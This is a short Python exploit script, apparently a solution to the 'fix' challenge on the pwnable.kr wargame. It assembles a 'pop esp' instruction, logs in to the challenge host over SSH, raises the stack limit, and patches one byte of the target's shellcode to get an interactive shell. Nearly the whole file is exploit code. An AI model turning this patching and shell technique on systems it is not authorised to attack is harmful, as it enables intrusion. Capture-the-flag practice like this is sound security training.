from pwn import *
from keystone import Ks, KS_ARCH_X86, KS_MODE_32
ks = Ks(KS_ARCH_X86, KS_MODE_32)
assembly_code = "pop esp"
encoding, count = ks.asm(assembly_code)
print(f"{assembly_code} =>", ' '.join(f"{byte:02x}" for byte in encoding))

context.log_level = "debug"
server = ssh("fix", "pwnable.kr", 2222, "guest")

# this not worked
#server.upload_data(b"#!/bin/sh\nulimit -s 999999\n~/fix\n", "/tmp/sylee/exploit.sh")
"""
#!/bin/sh
ulimit -s 99999999
~/fix
"""

proc = server.process("/tmp/sylee/exploit.sh")

proc.sendlineafter(b"Tell me the byte index to be fixed : ", b"15")
payload = str(encoding[0]).encode()
proc.sendlineafter(b"Tell me the value to be patched : ", str(encoding[0]).encode())

proc.interactive()
server.close()